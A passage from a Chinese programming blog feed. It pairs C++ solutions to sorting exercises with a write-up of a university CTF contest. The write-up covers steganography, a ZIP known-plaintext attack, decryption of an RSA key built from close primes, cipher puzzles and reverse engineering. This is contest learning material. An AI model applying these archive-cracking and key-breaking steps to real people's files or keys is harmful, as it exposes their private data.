class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Output-8"><a href="#Sample-Output-8" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">newbee</span> <span class="hljs-number">3</span> <span class="hljs-number">48</span><br><span class="hljs-attribute">team</span> <span class="hljs-number">3</span> <span class="hljs-number">60</span><br><span class="hljs-attribute">behappy</span> <span class="hljs-number">3</span> <span class="hljs-number">310</span><br></code></pre></td></tr></table></figure><h2 id="Code-5"><a href="#Code-5" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">team</span><br>&#123;<br>    <span class="hljs-type">char</span> name[<span class="hljs-number">11</span>];<br>    <span class="hljs-type">int</span> ta,tb,tc;<br>    <span class="hljs-type">int</span> actime;<br>    <span class="hljs-type">int</span> num;<br>&#125;t[<span class="hljs-number">100010</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">cmp</span><span class="hljs-params">(team t1,team t2)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(t1.num!=t2.num)<span class="hljs-keyword">return</span> t1.num&gt;t2.num;<br>    <span class="hljs-keyword">return</span> t1.actime &lt; t2.actime;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,a,b,c;<br>    <span class="hljs-keyword">while</span>(cin&gt;&gt;n)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            cin&gt;&gt;t[i].name&gt;&gt;t[i].ta&gt;&gt;t[i].tb&gt;&gt;t[i].tc;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;<br>            t[i].actime=<span class="hljs-number">0</span>;<br>            t[i].num=<span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">if</span>(t[i].ta!=<span class="hljs-number">-1</span>)<br>            &#123;<br>                t[i].ta+=<span class="hljs-number">20</span>*(a<span class="hljs-number">-1</span>);<br>                t[i].num++;<br>                t[i].actime+=t[i].ta;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(t[i].tb!=<span class="hljs-number">-1</span>)<br>            &#123;<br>                t[i].tb+=<span class="hljs-number">20</span>*(b<span class="hljs-number">-1</span>);<br>                t[i].num++;<br>                t[i].actime+=t[i].tb;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(t[i].tc!=<span class="hljs-number">-1</span>)<br>            &#123;<br>                t[i].tc+=<span class="hljs-number">20</span>*(c<span class="hljs-number">-1</span>);<br>                t[i].num++;<br>                t[i].actime+=t[i].tc;<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">sort</span>(t,t+n,cmp);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            cout &lt;&lt; t[i].name &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; t[i].num &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; t[i].actime &lt;&lt; endl;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="J-结构体排序题一"><a href="#J-结构体排序题一" class="headerlink" title="J.结构体排序题一"></a>J.结构体排序题一</h1><h3 id="Description-9"><a href="#Description-9" class="headerlink" title="Description"></a>Description</h3><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs erlang">现在给定一组二维平面上面的点的坐标,保证它的坐标是int类型的整数且大于等于<span class="hljs-number">0</span>小于等于<span class="hljs-number">99</span>.请你按照数据所给要求进行排序.<br>首先先以横坐标进行排序,若横坐标相同则按纵坐标排序,降序或升序将以<span class="hljs-number">0</span>和<span class="hljs-number">1</span>的形式表示,<span class="hljs-number">0</span>表示降序,<span class="hljs-number">1</span>表示升序.<br>比如,若数据开头给出<span class="hljs-number">0</span> <span class="hljs-number">1</span>的要求,则表示先以横坐标降序排列,若横坐标相同则按纵坐标升序排列.<br>再比如,若数据开头给出<span class="hljs-number">1</span> <span class="hljs-number">1</span>的要求,则表示先以横坐标升序排列,若横坐标相同则按纵坐标升序排列.<br>保证点的数量大于等于<span class="hljs-number">3</span>小于等于<span class="hljs-number">99</span><br></code></pre></td></tr></table></figure><h3 id="Input-9"><a href="#Input-9" class="headerlink" title="Input"></a>Input</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">第<span class="hljs-number">1</span>行包含三个数字,第一个数字和第二个数字分别表示横坐标和纵坐标的排序要求,<span class="hljs-number">0</span>表示降序,<span class="hljs-number">1</span>表示升序,第三个数字<span class="hljs-built_in">n</span>表示有几个点需要排序.<br>余下第<span class="hljs-number">2</span>~<span class="hljs-built_in">n</span>+<span class="hljs-number">1</span>行每行各有两个类型为<span class="hljs-built_in">n</span>个点的坐标,例如第<span class="hljs-number">2</span>行第一个数字表示第一个点横坐标,第二个数字表示第一个点的纵坐标.<br></code></pre></td></tr></table></figure><h3 id="Output-9"><a href="#Output-9" class="headerlink" title="Output"></a>Output</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">输出<span class="hljs-built_in">n</span>行坐标,一行表示一个点,格式如下<span class="hljs-symbol">:</span><br>(<span class="hljs-symbol">x0</span>,<span class="hljs-symbol">y0</span>)<br></code></pre></td></tr></table></figure><h3 id="Sample-Input-9"><a href="#Sample-Input-9" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span><span class="hljs-number">0</span> <span class="hljs-number">4</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">1</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">1</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">2</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">1</span> <span class="hljs-number">4</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">2</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">1</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Output-9"><a href="#Sample-Output-9" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs clojure">(<span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span>)<br>(<span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)<br>(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span>)<br>(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)<br>(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)<br>(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span>)<br>(<span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)<br>(<span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><h2 id="Code-6"><a href="#Code-6" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">node</span><br>&#123;<br>    <span class="hljs-type">int</span> x;<br>    <span class="hljs-type">int</span> y;<br>&#125;a[<span class="hljs-number">110</span>];<br><br><span class="hljs-type">int</span> rey,rex;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">cmp</span><span class="hljs-params">(node t1,node t2)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(rex)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(t1.x!=t2.x)  <span class="hljs-keyword">return</span> t1.x&lt;t2.x;<br>        <span class="hljs-keyword">if</span>(rey) <span class="hljs-keyword">return</span> t1.y&lt;t2.y;<br>        <span class="hljs-keyword">else</span>    <span class="hljs-keyword">return</span> t1.y&gt;t2.y;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(t1.x!=t2.x)  <span class="hljs-keyword">return</span> t1.x&gt;t2.x;<br>        <span class="hljs-keyword">if</span>(rey) <span class="hljs-keyword">return</span> t1.y&lt;t2.y;<br>        <span class="hljs-keyword">else</span>    <span class="hljs-keyword">return</span> t1.y&gt;t2.y;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-keyword">while</span>(cin&gt;&gt;rex&gt;&gt;rey&gt;&gt;n)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            cin&gt;&gt;a[i].x&gt;&gt;a[i].y;<br>        &#125;<br>        <span class="hljs-built_in">sort</span>(a,a+n,cmp);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(%d,%d)\n&quot;</span>,a[i].x,a[i].y);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="K-最强编码同学票数统计"><a href="#K-最强编码同学票数统计" class="headerlink" title="K.最强编码同学票数统计"></a>K.最强编码同学票数统计</h1><h3 id="Description-10"><a href="#Description-10" class="headerlink" title="Description"></a>Description</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">为了找出林大<span class="hljs-number">2020</span>新生中最擅长编写代码的同学，学校发起了一场投票。通过同学报名、前期遴选等环节，共提名了<span class="hljs-number">100</span>名同学作为选举人进行评选，假设他们的编号从<span class="hljs-number">1</span>到<span class="hljs-number">100</span>。现在学院已经采集到了<span class="hljs-built_in">n</span>名同学的投票结果，请你找出得票最多的程序员获得的票数(注：就是让你找相同数字的个数的最大值)。<br></code></pre></td></tr></table></figure><h3 id="Input-10"><a href="#Input-10" class="headerlink" title="Input"></a>Input</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs excel">输入：<br>第一行一个数<span class="hljs-built_in">n</span>(<span class="hljs-comment">1≤n≤100</span>) , 代表有多少位同学投票。<br>第二行<span class="hljs-built_in">n</span>个数<span class="hljs-symbol">:a1</span>,<span class="hljs-symbol">a2</span>⋯an,  ai(<span class="hljs-number">1</span>≤ai≤<span class="hljs-number">100</span>)代表第i位同学投票所选的林大最擅长编码的那个程序员的编号。输入数据有多组！<br></code></pre></td></tr></table></figure><h3 id="Output-10"><a href="#Output-10" class="headerlink" title="Output"></a>Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">输出：<br>每组数据的输出占一行 , 输出得票最多的那个同学获得的票数（相同编号的个数的最大值）。<br></code></pre></td></tr></table></figure><h3 id="Sample-Input-10"><a href="#Sample-Input-10" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">输入样例1：<br>6<br>1<span class="hljs-number"> 2 </span>4<span class="hljs-number"> 7 </span>7 7<br>4<br>5<span class="hljs-number"> 5 </span>5 5<br></code></pre></td></tr></table></figure><h3 id="Sample-Output-10"><a href="#Sample-Output-10" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">输出样例1：<br>3<br>4<br></code></pre></td></tr></table></figure><h2 id="Code-7"><a href="#Code-7" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> a[<span class="hljs-number">110</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n;<br><span class="hljs-keyword">while</span>(cin&gt;&gt;n)<br>&#123;<br><span class="hljs-built_in">memset</span>(a,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(a));<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>&#123;<br><span class="hljs-type">int</span> tmp;<br>cin&gt;&gt;tmp;<br>a[tmp]++;<br>&#125;<br><span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">100</span>;i++)<br>&#123;<br>ans=<span class="hljs-built_in">max</span>(ans, a[i]);<br>&#125;<br>cout&lt;&lt;ans&lt;&lt;endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> NEFUOJ </tag>
            
            <tag> 排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-NEFU校赛-题解</title>
      <link href="/2020/12/211cd2ab.html"/>
      <url>/2020/12/211cd2ab.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>Write by NEFUNSI：</p><p>ghosin</p><p>0ERROR</p></blockquote><h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><hr><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>下载 <code>signin.txt</code> 打开得到一串 <code>base64</code>，解码得到 <code>flag&#123;we1come_t0_NEFUCTF!&#125;</code> 。</p><hr><h2 id="Re-SignUp"><a href="#Re-SignUp" class="headerlink" title="Re_SignUp"></a>Re_SignUp</h2><p>下载 <code>SignUp</code> ，使用 <code>010 Editor</code> 打开发现是 <code>Linux</code> 可执行文件。用 <code>ida64</code> 打开可看到 <code>main</code> 函数处有字符串 <code>xr yeI^r&#125;.s&#123;A)qAL/h&#123;lM&#123;AI.(rz?c</code> ，根据 <code>Hint</code> 中的 <code>xor</code> 使用<a href="https://gchq.github.io/CyberChef/#recipe=XOR_Brute_Force(1,100,0,'Standard',false,true,false,'')&input=eHIgeWVJXnJ9LnN7QSlxQUwvaHtsTXtBSS4ocno/Yw">在线工具爆破</a>可得到 <code>fl&gt;g&#123;W@lc0me_7o_R1verSe_W06ld!&#125;</code> 。</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="untitle"><a href="#untitle" class="headerlink" title="untitle"></a>untitle</h2><p>下载压缩包，发现加密的 <code>flag.txt</code> 和没加密的 <code>untitle.wav</code> 。解压 <code>untitle.wav</code> ，发现是倒放。使用 <code>Audacity</code> 逆转后听歌识曲得到 <a href="https://music.163.com/#/song?id=1499834227"><code>Untitled</code></a> 。<br>以 <code>Untitled</code> 作为密码，使用 <code>WinRAR</code> 解压 <code>flag.txt</code> 发现报错和 fakeflag 。</p><blockquote><p>! G:\labs\nefuctf\misc\111flag111 (2).rar: 无法设置 C:\Users\ghosi\AppData\Local\Temp\Rar$DRb13916.37568\flag.txt 的安全数据<br>这个安全 ID 不能分配为此对象的所有者。</p></blockquote><p>怀疑是 <a href="https://joner11234.github.io/article/85357d8d.html"><code>NTFS交换数据流隐写</code></a> ，使用 <code>NtfsStreamsEditor2</code> 扫描得到 <code>flag&#123;M4ke_m1sc_gr3at_ag@in&#125;</code> 。</p><hr><h2 id="蛇图攻击"><a href="#蛇图攻击" class="headerlink" title="蛇图攻击"></a>蛇图攻击</h2><p>下载得到一个 zip 压缩包，解压得到 <code>看到了吗flag就在那.zip</code> 和 <code>蛇图.jpg</code>，在 <code>看到了吗flag就在那.zip</code> 中看到要找的 <code>flag.txt</code> 和已有明文的 <code>蛇图.jpg</code> ，使用 <code>ZIP已知明文攻击</code> 即可得到 <code>flag.txt</code> ，内容为 <code>flag&#123;congratulation~~&#125;</code> 。这里注意在压缩 <code>蛇图.jpg</code> 的时候要使用 <strong><code>Bandizip</code></strong> ，使用其他压缩软件可能会使 <code>AZPR</code> 类软件出现类似 <code>No matching files in selected archives</code> 的错误。</p><hr><h2 id="别人家的孩子"><a href="#别人家的孩子" class="headerlink" title="别人家的孩子"></a>别人家的孩子</h2><p>下载附件打开听一下，发现左右声道不同。拖进 <code>Audacity</code> ，去掉左声道的歌曲，右声道前半部分为莫斯电码，记录下内容为 <code>..-./.-../.-/--./-/-----/-.../...--</code> ，可解出内容为 <code>flagt0b3</code> ，后半部分为 <a href="https://baike.baidu.com/item/DTMF"><code>dtmf</code></a>，使用 <code>dtmf2num</code> 读取到 <code>121111117114115101108102</code> ，可解出 <code>yourself</code>。至此拼接得到 <code>flag&#123;t0b3yourself&#125;</code> 。</p><h2 id="谁还没受过伤呢"><a href="#谁还没受过伤呢" class="headerlink" title="谁还没受过伤呢"></a>谁还没受过伤呢</h2><p>根据题意，心愿小姐失恋了，然后附了一个QQ号：2508898249，因此就从QQ号下手找线索。</p><p><img src="https://i.loli.net/2020/12/21/5GgDxH2Rf1AjhWk.png" alt="img"></p><p>打开资料页可以看出信息量不大，主要就是有生日，其他信息不出意外应该都在空间里面</p><p>打开空间，首先看到几条说说，其中包含一条：</p><p><img src="https://i.loli.net/2020/12/21/exkSGU8NCw1Lq5j.png" alt="img"></p><p>百度网盘打开是一个IDOL的文件夹，下载以后是9张许嵩的照片，这里注意了，第9张照片明显体积偏大，而照片又很糊，说明照片里面有东西<img src="https://i.loli.net/2020/12/21/w9GREemj5N7APrK.png" alt="img"></p><p>继续翻说说，又发现了一个线索说说</p><p><img src="https://i.loli.net/2020/12/21/JtdrfA9ji5FcIHR.png" alt="img"></p><p>不知道有什么用，暂且留在这里不动。</p><p>看看其他地方，相册里面有一个有问题的照片，根据问题很明显就是前面心愿小姐所@的人就是问题的答案，填入DK_night后，得到一张图片，扫描图片上的二维码即可得到前一半flag</p><p>然后继续看，留言板里有一段话</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">G1v3_me_s0m3_rEd_P4cKe7eS_t0_g3t_7h3_h1nt!<br></code></pre></td></tr></table></figure><p>不知道有什么用，暂且放着。</p><p>空间里能得到的线索就这么多了，再回头看看照片，第九张照片用010Editor打开后发现有隐写的zip格式的压缩包，分离出来以后如图<img src="https://i.loli.net/2020/12/21/X5y4RHrWDAefukp.png" alt="img"></p><p>hint已经很明显了，是生日按照格式输入就是密码，但是填入前面的日期却无法解密，仔细观察后发现上面的生日是农历，将其日期转成公历以后即可得到2001.5.14(这里这个日期有点坑，转成2001年的四月廿二好像日期不太对，换思路转为今年的四月廿二才为正确日期，成功解密)，还有一种方法是知道了密码格式之后直接放进cracker里面按照格式爆破即可得到，速度也很快，这里就不作具体说明了。</p><p>打开flag.doc以后发现里面是空的，ctrl+a之后发现有字符，文字换颜色之后发现是个假flag，说明线索不在文档里，再看看文档的详细信息<img src="https://i.loli.net/2020/12/21/geIH4byZfwMAPWB.png" alt="img"></p><p>可以看出备注和管理者里面各有一堆乱序字符，其中管理者里面的字符有明显的Base64加密标志，解密一次后发现变成了乱码，怀疑是加密后的成分残缺导致的错位，考虑到上面备注内的不明所以的乱码，将其和此段合并后解密(N次套娃)后即可得到后半flag</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">eve<span class="hljs-symbol">n_1</span>f_i_L<span class="hljs-number">0</span>Ve_U&#125;<br></code></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><hr><h2 id="RSA1-0"><a href="#RSA1-0" class="headerlink" title="RSA1.0"></a>RSA1.0</h2><blockquote><p>前置知识: <a href="https://xz.aliyun.com/t/6459">https://xz.aliyun.com/t/6459</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-comment"># 由题目可知</span><br>c = <span class="hljs-number">45771827077895268121546606393404724664015354394782828337635308358292455516045347632184096192996835878084629358486100781061415523065007935763870549459874855232581330470311918549209690663379064436674445311856972558138654423953641880869235765375826041038321658329327107626577671053285966037170551853374920563440</span><br>e = <span class="hljs-number">65537</span><br><br>n = <span class="hljs-number">51644741119502351404435614782384203642721946675648874025147110583432277606213746585645021132709993574641883435114709470653847057718236543709859136714778649404725233027975626929711061148770545740304700844663373207681750776232949001954620241734085537399155514559867656395449958909477471179617512586129540850043</span><br><span class="hljs-comment"># yafu 分解 n 可得 p 和 q</span><br>p = <span class="hljs-number">7186427563087403123764567435071522152765535485843889386595810558353757249884932307781450308876687526723957522099910738089951348400929674280355762675680509</span><br>q = <span class="hljs-number">7186427563087403123764567435071522152765535485843889386595810558353757249884932307781450308876687526723957522099910738089951348400929674280355762675680727</span><br><br><span class="hljs-comment"># 计算私钥 d</span><br>d = gmpy2.invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><br><span class="hljs-comment"># 解密 m</span><br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment"># b&#x27;flag&#123;now_y0u_know_rsa&#125;&#x27;</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="are-you-file"><a href="#are-you-file" class="headerlink" title="are you file?"></a>are you file?</h2><p>下载 <code>6.txt</code> ，发现是 <code>Ook!</code> 编码，使用<a href="https://www.splitbrain.org/services/ook">在线工具</a>解码得到 <code>呋食食性噗哮食冬註魚嗥笨麼噤覺我嘶人雜嗚有怎囑爾發常哮出沒喜唬有意吖人哞哈類更我呆魚蜂圖呆喜食氏告嘶嗒洞現訴訴盜萌現嘶嘿雜非嗒和噗發笨</code> ，是熊曰编码，使用<a href="http://hi.pcmoe.net/index.html">在线工具</a>解码得到 <code>G2aZlXllv1_uvohfim3&#125;deBb=f&#123;yhenaotGmkbFXgfpfoadelf!</code>，猜测栅栏密码，使用<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">在线工具</a>，每组字数 <code>3</code> 解码得到 <code>GmG23ma&#125;kZdbleFXBXlbgl=fvfp1&#123;f_youhavedonehalfofit!</code> 。根据结尾 <code>_youhavedonehalfofit!</code> 可知已经解开一半了。去掉这部分，猜测接下来是W型栅栏密码，因为栅栏密码加密后第一位不变，故逆转字符串为 <code>f&#123;1pfvf=lgblXBXFelbdZk&#125;am32GmG</code> ，使用<a href="http://www.atoolbox.net/Tool.php?Id=777">在线工具</a>，栏数为 <code>3</code> 可得到 <code>flag&#123;bml1X3BpX2FfeGlvbmdfZGk=&#125;</code> 。解码其中的 <code>base64</code> 可得到 <code>flag&#123;niu_pi_a_xiong_di&#125;</code> 。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><blockquote><p>详见：[f1oat’s blog - 校赛web-wp](</p></blockquote><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Test-your-math"><a href="#Test-your-math" class="headerlink" title="Test_your_math"></a>Test_your_math</h2><p>IDA打开后查看字符串，发现flag关键字<img src="https://i.loli.net/2020/12/21/xVCm8J2NhjWk659.png" alt="img"></p><p>查找之后反向寻找其在程序中的位置</p><p><img src="https://i.loli.net/2020/12/21/TahMxNjCkoU3PSt.png" alt="img"></p><p>继续在主函数回溯其判断输入数据正确性的位置<img src="https://i.loli.net/2020/12/21/IWMS8kvAHunGfVl.png" 